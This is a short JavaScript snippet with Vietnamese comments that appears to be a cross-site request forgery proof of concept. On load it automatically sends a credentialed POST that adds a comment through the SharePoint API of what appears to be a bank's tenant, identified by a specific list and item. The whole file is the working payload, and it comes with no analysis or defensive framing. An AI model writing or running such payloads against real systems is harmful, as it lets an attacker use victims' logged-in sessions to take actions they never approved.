(function(){
  const ACTION_URL = 'https://sacombankvn.sharepoint.com/sites/QunldnGBM/_api/web/lists(@a1)/GetItemById(@a2)/Comments()?@a1=%27%7B63c44e7f%2Dc900%2D437a%2Dbd07%2Da4ff273afc14%7D%27&@a2=%271%27'; // <-- đổi thành endpoint kiểm soát của bạn
  const AUTO_RUN = true; // false nếu muốn gọi sendComment() thủ công

  function sendComment() {
    return fetch(ACTION_URL, {
      method: 'POST',
      // Nếu server mong JSON:
      headers: { 'Content-Type': 'application/json;charset=UTF-8' },
      // Nếu bạn muốn gửi cookie (chỉ dùng trên môi trường bạn kiểm soát):
      credentials: 'include',
      body: JSON.stringify({ text: "-------------", mentions: [] })
    })
    .then(r => {
      console.log('status', r.status);
      return r.text().then(t => console.log('response:', t));
    })
    .catch(err => console.error('send failed', err));
  }

  if (AUTO_RUN) {
    setTimeout(()=> sendComment(), 50);
  } else {
    window.sendComment = sendComment;
  }
})();
